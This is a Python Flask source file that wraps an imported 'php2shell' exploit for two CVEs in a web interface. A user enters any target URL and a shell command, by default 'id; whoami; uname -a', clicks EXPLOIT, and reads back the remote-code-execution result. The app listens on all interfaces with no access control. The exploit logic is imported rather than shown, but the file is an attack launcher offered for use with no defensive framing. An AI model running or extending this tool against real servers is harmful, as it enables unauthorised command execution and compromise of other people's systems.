#!/usr/bin/env python3
"""
php2shell web app
=================

Minimal web UI around the php2shell exploit (CVE-2026-109618 / CVE-2026-109619):
enter a target URL, pick a command, click EXPLOIT, read the result.

Run:
    python3 webapp.py [port]        # default port 8899

The exploit runs in a background thread; results are kept in-memory (latest
run per run-id).
"""
import threading
import time
import uuid

from flask import Flask, jsonify, render_template, request

import exploit as p2s

app = Flask(__name__)

# In-memory result store: run_id -> {started, result}
RUNS = {}
MAX_RUNS = 100


def _run(run_id, params):
    RUNS[run_id] = {"started": time.time(), "result": None}
    try:
        result = p2s.php2shell_exploit(**params)
    except Exception as e:  # noqa: BLE001 - surface anything to the UI
        result = {"target": params.get("url"), "ok": False, "rce": False,
                  "error": repr(e), "output": "", "warnings": [], "notes": []}
    RUNS[run_id]["result"] = result


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/exploit", methods=["POST"])
def api_exploit():
    data = request.get_json(silent=True) or request.form
    url = (data.get("url") or "").strip()
    if not url:
        return jsonify({"error": "target URL is required"}), 400

    params = {
        "url": url,
        "cmd": (data.get("cmd") or "id; whoami; uname -a").strip(),
        "seed_path": (data.get("seed_path") or p2s.DEFAULT_SEED_PATH).strip(),
        "trigger_path": (data.get("trigger_path") or p2s.DEFAULT_TRIGGER_PATH).strip(),
        "gadget": (data.get("gadget") or p2s.DEFAULT_GADGET).strip(),
        "prop": (data.get("prop") or p2s.DEFAULT_PROP).strip(),
        "timeout": 20.0,
    }
    for k in ("seed_path", "trigger_path"):
        if not params[k].startswith("/"):
            params[k] = "/" + params[k]

    run_id = uuid.uuid4().hex[:12]
    t = threading.Thread(target=_run, args=(run_id, params), daemon=True)
    t.start()
    return jsonify({"run_id": run_id})


@app.route("/api/result/<run_id>")
def api_result(run_id):
    run = RUNS.get(run_id)
    if run is None:
        return jsonify({"error": "unknown run id"}), 404
    result = run["result"]
    if result is None:
        return jsonify({"done": False, "elapsed": round(time.time() - run["started"], 2)})
    # prune old runs
    if len(RUNS) > MAX_RUNS:
        for k in sorted(RUNS, key=lambda k: RUNS[k]["started"])[:len(RUNS) - MAX_RUNS]:
            RUNS.pop(k, None)
    return jsonify({
        "done": True,
        "elapsed": round(time.time() - run["started"], 2),
        "result": result,
    })


@app.route("/api/health")
def health():
    return jsonify({"ok": True, "service": "php2shell-webapp"})


if __name__ == "__main__":
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    print("php2shell web app -> http://127.0.0.1:%d" % port)
    app.run(host="0.0.0.0", port=port, debug=False)
